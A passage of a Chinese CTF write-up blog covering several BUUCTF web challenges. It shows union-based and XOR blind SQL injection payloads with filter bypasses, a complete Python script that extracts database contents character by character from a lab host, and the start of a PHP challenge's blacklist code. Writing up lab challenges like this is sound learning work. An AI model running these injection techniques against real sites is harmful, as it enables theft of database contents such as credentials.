punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a<span class="token comment">#记得第一个2加反引号,或者使用a.2</span>如果反引号<span class="token identifier"><span class="token punctuation">`</span><span class="token punctuation">`</span></span>被过滤<span class="token punctuation">,</span>可以使用为字段起别名的方式<span class="token punctuation">.</span><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span> <span class="token keyword">as</span> xxx<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x<span class="token punctuation">;</span>第一个查询<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span>该查询的功能是从 <span class="token keyword">user</span> 表中选取 id 等于 <span class="token operator">-</span><span class="token number">1</span> 的所有行。一般而言，id 属于主键或者唯一键，通常不会存在 id 为 <span class="token operator">-</span><span class="token number">1</span> 的行，所以这个查询可能不会返回任何结果。不过，它的目的是要保证和第二个查询的列数一致。第二个查询<span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x这个查询较为复杂，下面逐步拆解：子查询<span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x子查询的功能是把两个查询结果合并。第一个查询 <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c 会生成一行数据，这一行有三个列，分别命名为 a、b、c，它们的值依次为 <span class="token number">1</span>、<span class="token number">2</span>、<span class="token number">3</span>。第二个查询 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users 会从 users 表中选取所有行。这两个查询的结果通过 <span class="token keyword">UNION</span> 合并成一个临时结果集，并且给这个临时结果集起了别名 x。外层查询<span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>x外层查询从临时结果集 x 里选取数据。前两列的值分别为常量 <span class="token number">1</span> 和 <span class="token number">2</span>。第三列运用了 GROUP_CONCAT 函数，该函数的作用是把 x 表中 c 列的所有值连接成一个字符串，默认情况下，这些值会用逗号分隔。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但首先不知道列数，order还被ban了。。。不知道只能慢慢select了</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,3'</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8dddfbbccf96e390c83fc2d112b8cf98.png"></p><p><del>嗯，总之就当我发了22次广告吧（</del></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/199fce82d5660ff4a41a2a611fbe68c8.png"></p><p>搞2！</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span><span class="token comment">#web1</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 union select * from web1)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>but<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ae864d3a7c4fa6df2981d8bc66e96eaf.png"></p><p>但InnoDb引擎可</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 union select * from web1)'</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token keyword">where</span> database_name<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>得<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from mysql.innodb_table_stats where database_name="web1"'</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name="web1"'</span><span class="token comment">#懒得转义我这里手动加的双引号hhh</span><span class="token comment">#ads,users</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x<span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 union select * from web1)'</span>得<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),(select group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from ads)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span>先试了ads:<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,database(),(select/**/group_concat(x.e)/**/from/**/(select/**/(select/**/1)a,(select/**/2)b,(select/**/3)c,(select/**/4)d,(select/**/5)e/**/union/**/select/**/*/**/from/**/users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span>仍是<span class="token comment">#The used SELECT statements have a different number of columns</span>我试到f结果发现溢出了。。。于是试<span class="token keyword">user</span>users表的列数正好是<span class="token number">3</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),(select group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span><span class="token comment">#flag{ecbdd94b-681f-4293-9835-9cb932a63393}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后放下payoad: <code>-1'union/**/select/**/1,database(),(select/**/group_concat(x.c)/**/from/**/(select/**/(select/**/1)a,(select/**/2)b,(select/**/3)c/**/union/**/select/**/*/**/from/**/users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</code>哦耶耶~</p><hr><h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h3><!--Log in as `admin`!--><!--We found the account cookie/monster--><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/891c03279de5d67cbb68e7d0456240c5.png"></p><p>啊哈？</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/340c116a5c4220871a5b0b3e8410e63a.png"></p><p>这也太💦了</p><hr><h3 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h3><p>盲注+python，也是拉满buff了</p><p>2：<del>一拳一个嘤嘤怪</del></p><p>3：<del>满屏红字吓死人了（</del></p><p>5：谢谢涨词了navienavienavie天真的天真的天真的</p><p>这是过滤了啥，咋有的可有的不可？</p><p>buer，这username也太哈人了吧，说这是白名单也不为过（</p><p>然后想到让找第六个，那说明好像是要搞id（bushi)咳咳</p><pre class="line-numbers language-none"><code class="language-none">Clever! But not this table.翻译=&gt;真聪明！但不是这个表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>fuzz了一下，空格和注释符还有一些关键词被ban了，发现’or’=’or’或TRUE会返回id=1时的页面：</p><p><a href="https://blog.csdn.net/SoporAeternus12/article/details/124001820">sql注入漏洞之异或注入_sql异或注入-CSDN博客</a></p><p><a href="https://www.cnblogs.com/vincy99/p/9642956.html">SQL注入学习总结(八):其他SQL注入的异或注入 - 哈哈哈1014 - 博客园</a></p><p>判断不了列数，我就直接搞了</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">^</span><span class="token number">1</span><span class="token comment">--&gt;ture</span>?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--&gt;error</span>?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token comment">--&gt;ture</span>下面为脚本内容：<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token comment">#information_schema,performance_schema,test,mysql,geek</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token string">'geek'</span><span class="token punctuation">)</span><span class="token comment">#F1naI1y,Flaaaaag</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'Flaaaaag'</span><span class="token punctuation">)</span><span class="token comment">#id,fl4gawsl</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'F1naI1y'</span><span class="token punctuation">)</span><span class="token comment">#id,username,password</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>fl4gawsl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>Flaaaaag<span class="token punctuation">)</span><span class="token comment">#NO! Not this! Click others~~~,yingyingying~ Not this as well~~,Ohhh You find the flag read on!&lt;br/&gt;Ohhh You #find the flag read on!&lt;br/&gt;Ohhh You find the flag(然后是循环)</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>F1naI1y<span class="token punctuation">)</span><span class="token comment">#mygod,welcome,site,site,site,site（碎碎念：那很site了）,Syc,finally,flag  </span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>F1naI1y<span class="token punctuation">)</span><span class="token comment">#cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http:#//www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag{7cf79887-48e3-42a4-ae01-17a0cb33c188}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote_plus<span class="token comment"># 配置目标信息</span>target_url <span class="token operator">=</span> <span class="token string">"http://75388fa0-b0c7-4fc1-b201-295652d9481b.node5.buuoj.cn:81/search.php"</span>  <span class="token comment"># 目标URL</span>param_name <span class="token operator">=</span> <span class="token string">"id"</span>  <span class="token comment"># 存在注入的参数名</span>true_keyword <span class="token operator">=</span> <span class="token string">"NO! Not this! Click others~~~"</span>  <span class="token comment"># 条件为真时的页面特征</span>max_length <span class="token operator">=</span> <span class="token number">500</span>  <span class="token comment"># 最大猜测长度</span><span class="token keyword">def</span> <span class="token function">check_condition</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    发送请求并检查条件是否成立    :param payload: SQL条件语句（不带闭合）    :return: 布尔值，表示条件是否成立    """</span>    <span class="token comment"># 构造完整Payload并编码</span>    full_payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0^</span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string"> "</span></span>    <span class="token comment">#使用 f - 字符串可以直接在字符串中插入变量的值，相比于传统的字符串格式化方法（如 % 格式化或 str.format() 方法）</span>    encoded_payload <span class="token operator">=</span> quote_plus<span class="token punctuation">(</span>full_payload<span class="token punctuation">)</span>  <span class="token comment"># URL 编码</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>target_url<span class="token punctuation">}</span></span><span class="token string">?</span><span class="token interpolation"><span class="token punctuation">{</span>param_name<span class="token punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_payload<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>            timeout<span class="token operator">=</span><span class="token number">5</span>        <span class="token punctuation">)</span>        <span class="token keyword">return</span> true_keyword <span class="token keyword">in</span> response<span class="token punctuation">.</span>text    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 请求失败: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">extract_data</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    使用二分法逐字符提取数据    :param query: SQL查询语句    :return: 提取的字符串    """</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> max_length<span class="token punctuation">)</span><span class="token punctuation">:</span>        low<span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">126</span>        <span class="token keyword">while</span> low <span class="token operator">&lt;=</span> high<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            condition <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"((ascii(substr(</span><span class="token interpolation"><span class="token punctuation">{</span>query<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1)))&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">)"</span></span>            <span class="token keyword">if</span> check_condition<span class="token punctuation">(</span>condition<span class="token punctuation">)</span><span class="token punctuation">:</span>                low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>high<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment">#当 check_condition 返回 False 时，high 会被更新为 mid - 1。所以，目标字符的 ASCII 码实际上就是 high + 1。</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 当前进度: </span><span class="token interpolation"><span class="token punctuation">{</span>result<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment">#print("[+] 正在提取数据库名称...")</span>    <span class="token comment">#db_name = extract_data("(select(group_concat(schema_name))from(information_schema.schemata)")</span>    <span class="token comment">#print(f"[+] 数据库名称: {db_name}")</span>    <span class="token comment">#information_schema,performance_schema,test,mysql,geek</span>    <span class="token comment">#table_name = extract_data("(select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')")</span>    <span class="token comment">#print(f"[+] 表名称: {table_name}")</span>    <span class="token comment">#F1naI1y,Flaaaaag</span>    <span class="token comment">#column_name = extract_data("(select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')")</span>    <span class="token comment">#print(f"[+] 列名称: {column_name}")</span>    <span class="token comment">#id,fl4gawsl</span>    flag <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"(select(group_concat(id))from(F1naI1y)"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 内容: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token comment">#cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag{7cf79887-48e3-42a4-ae01-17a0cb33c188}</span><span class="token comment"># -*- coding: UTF-8 -*- #</span><span class="token triple-quoted-string string">"""@filename:final SQL.py@auther:qing@time:2025-3-31"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>值得注意的是，我在编写脚本时，在设置<code>low, high = 32, 126</code>时一开始范围是从0到200（想着无所谓），但这样爆出的结果会有乱码，因此还是设置在正常范围内吧。</p><hr><h3 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h3><p>这题真无敌了吧，我打算复制去Bing一下，结果直接自动翻译了。</p><pre class="line-numbers language-none"><code class="language-none">Resistance is futile! Bring back Futurella or we'll invade!  Also, the flag is flag{94accd60-8f06-4be2-8852-5bda9d9a0283}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可能就是style.css在作祟</p></blockquote><hr><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token comment">//例子 c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span 